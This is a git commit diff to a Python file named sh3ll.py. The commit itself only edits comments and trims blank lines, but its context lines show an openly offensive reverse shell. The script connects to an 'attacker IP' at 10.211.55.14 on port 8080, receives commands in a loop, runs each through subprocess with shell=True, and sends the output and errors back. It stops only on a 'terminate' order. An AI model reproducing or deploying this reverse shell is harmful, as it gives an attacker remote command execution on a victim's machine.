079bd008db47f4b1cb00a21f0094aee943fd3188
Sic4rio <75425513+sic4rio@users.noreply.github.com>
2021-12-09 16:43:02 +1100

    Update sh3ll.py

--- sh3ll.py
+++ sh3ll.py
@@ -1,5 +1,3 @@
-
-
 import socket    # For Building TCP Connection
 import subprocess # To start the shell in the system
 
@@ -8,7 +6,7 @@ def connect():
     s.connect(('10.211.55.14', 8080)) # Here we define the Attacker IP and the listening port
 
     while True:
-        command = s.recv(1024) # keep receiving commands from the Kali machine, read the first KB of the tcp socket
+        command = s.recv(1024) # keep receiving commands from the attacker machine, read the first KB of the tcp socket
 
         if 'terminate' in command.decode(): # if we got termiante order from the attacker, close the socket and break the loop
             s.close()
@@ -17,7 +15,7 @@ def connect():
 
             CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             s.send(CMD.stdout.read()) # send back the result
-            s.send(CMD.stderr.read()) # send back the error -if any-, such as syntax error
+            s.send(CMD.stderr.read()) # send back the error, such as syntax error
 
 def main():
     connect()
